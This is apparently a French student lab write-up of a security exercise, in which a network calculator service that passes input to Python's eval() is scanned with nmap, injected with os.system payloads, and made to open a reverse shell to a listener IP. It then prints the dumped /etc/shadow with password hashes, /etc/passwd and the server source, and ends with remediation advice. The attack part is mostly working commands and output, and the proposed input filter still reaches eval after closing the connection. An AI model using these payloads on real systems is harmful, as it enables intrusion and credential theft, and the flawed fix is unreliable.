# TP5 SECU : Exploit, pwn, fix

## 1. Reconnaissance

### 🌞 Déterminer
```
Avec Wireshark
```

### 🌞 Scanner le réseau
```
sudo nmap -sS -p 13337 10.33.64.0/20 > toto

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)
```

### 🦈 tp5_nmap.pcapng
[tp5_nmap.pcapng](tp5_nmap.pcapng)

### 🌞 Connectez-vous au serveur
```
L'application est une calculatrice simple avec l'ip 10.33.66.78 sur le port 13337
```

## 2. Exploit

### 🌞 Injecter du code serveur

```
danyg@danygThinkPad:~$ netcat 193.250.183.197 12781
d
Hello__import__('os').system('sleep 5')
0
```

## 3. Reverse shell

```
danyg@danygThinkPad:~$ netcat 10.33.72.233 13337
d
Hello__import__('os').system('sh -i >& /dev/tcp/10.33.79.176/9999 0>&1')

```

```
danyg@danygThinkPad:~$ nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.33.72.233 57666
sh: cannot set terminal process group (5035): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1# ls
```


### 🌞 Pwn

- /etc/shadow
```
sh-5.1# cat shadow
cat shadow
root:$6$atP4CieUTrEFXHsk$XKnowYr3fH1wS/ROSrPilmXL5mkUZPK0xlZ3KN2v0FZ2T/ndSxTzqjeqsWuRKZl5nFlXuFtdQvhQnLLm/XFLB1::0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19653::::::
dbus:!!:19653::::::
tss:!!:19653::::::
sssd:!!:19653::::::
sshd:!!:19653::::::
chrony:!!:19653::::::
systemd-oom:!*:19653::::::
noah:$6$sdPZ9tJBSUK6uKXY$LmZemdiomYbtMpg2IMzhIFedU3abEU5PEzHhpV/TRTtTDY./bO3HBHmzqhA2E49joYzkF6Lcq.glzS.QeApHx1::0:99999:7:::
tcpdump:!!:19653::::::
netdata:!!:20020::::::
```
- /etc/passwd
```
sh-5.1# cat passwd
cat passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
noah:x:1000:1000:noah:/home/noah:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
netdata:x:991:991:Netdata pseudo user:/usr/share/netdata:/sbin/nologin
```
- voler le code serveur de l'application
[server.py](/tp5/server.py)
```
sh-5.1# cat server.py
cat server.py
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 13337))  

s.listen(1)
conn, addr = s.accept()

while True:

    try:
        # On reçoit la string Hello du client
        data = conn.recv(1024)
        if not data: break
        print(f"Données reçues du client : {data}")

        conn.send("Hello".encode())

        # On reçoit le calcul du client
        data = conn.recv(1024)
        data = data.decode().strip("\n")

        # Evaluation et envoi du résultat
        res  = eval(data)
        conn.send(str(res).encode())
         
    except socket.error:
        print("Error Occured.")
        break

conn.close()
```
- déterminer si d'autres services sont disponibles sur la machine
```
sh-5.1# systemctl list-units -t service
systemctl list-units -t service
  UNIT                               LOAD   ACTIVE SUB     DESCRIPTION
  auditd.service                     loaded active running Security Auditing Service
  calculatrice.service               loaded active running Super calculatrice réseau
  chronyd.service                    loaded active running NTP client/server
  crond.service                      loaded active running Command Scheduler
  dbus-broker.service                loaded active running D-Bus System Message Bus
  dracut-shutdown.service            loaded active exited  Restore /run/initramfs on shutdown
  firewalld.service                  loaded active running firewalld - dynamic firewall daemon
  getty@tty1.service                 loaded active running Getty on tty1
  kdump.service                      loaded active exited  Crash recovery kernel arming
  kmod-static-nodes.service          loaded active exited  Create List of Static Device Nodes
  lm_sensors.service                 loaded active exited  Hardware Monitoring Sensors
  lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
  netdata.service                    loaded active running Real time performance monitoring
  NetworkManager-wait-online.service loaded active exited  Network Manager Wait Online
  NetworkManager.service             loaded active running Network Manager
  nis-domainname.service             loaded active exited  Read and set NIS domainname from /etc/sysconfig/network
  rsyslog.service                    loaded active running System Logging Service
  sshd.service                       loaded active running OpenSSH server daemon
  systemd-boot-update.service        loaded active exited  Automatic Boot Loader Update
  systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
  systemd-journald.service           loaded active running Journal Service
  systemd-journald@netdata.service   loaded active running Journal Service for Namespace netdata
  systemd-logind.service             loaded active running User Login Management
  systemd-network-generator.service  loaded active exited  Generate network units from Kernel command line
  systemd-random-seed.service        loaded active exited  Load/Save OS Random Seed
  systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
  systemd-sysctl.service             loaded active exited  Apply Kernel Variables
  systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
  systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
  systemd-udev-trigger.service       loaded active exited  Coldplug All udev Devices
  systemd-udevd.service              loaded active running Rule-based Manager for Device Events and Files
  systemd-update-utmp.service        loaded active exited  Record System Boot/Shutdown in UTMP
  systemd-user-sessions.service      loaded active exited  Permit User Sessions
  user-runtime-dir@1000.service      loaded active exited  User Runtime Directory /run/user/1000
  user@1000.service                  loaded active running User Manager for UID 1000
```

## II. Remédiation

### 🌞 Proposer une remédiation dév

- ne pas utiliser eval() dans le code car permet d'executer du code python et non calculer
- mettre des conditions du coté serveur pour filter le input comme ce ci par exemple
```
import socket
import re

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 13337))  

s.listen(1)
conn, addr = s.accept()

while True:

    try:
        # On reçoit la string Hello du client
        data = conn.recv(1024)
        if not data: break
        print(f"Données reçues du client : {data}")

        conn.send("Hello".encode())

        # On reçoit le calcul du client
        data = conn.recv(1024)
        data = data.decode().strip("\n")
        # condition ajouté
        for i in data:
            if i not in '0123456789 +-*':
                conn.close()
        # Evaluation et envoi du résultat
        
        res  = eval(data)
        conn.send(str(res).encode())
        
         
    except socket.error:
        print("Error Occured.")
        break

conn.close()
```

### 🌞 Proposer une remédiation système
- ne pas lancer le serveur en tant que root
- le serveur ne doit en aucun cas envoyer des informations vers l'extérieur, il faut donc bloquer toutes les sorties qui sont autres que le fonctionnement de base du serveur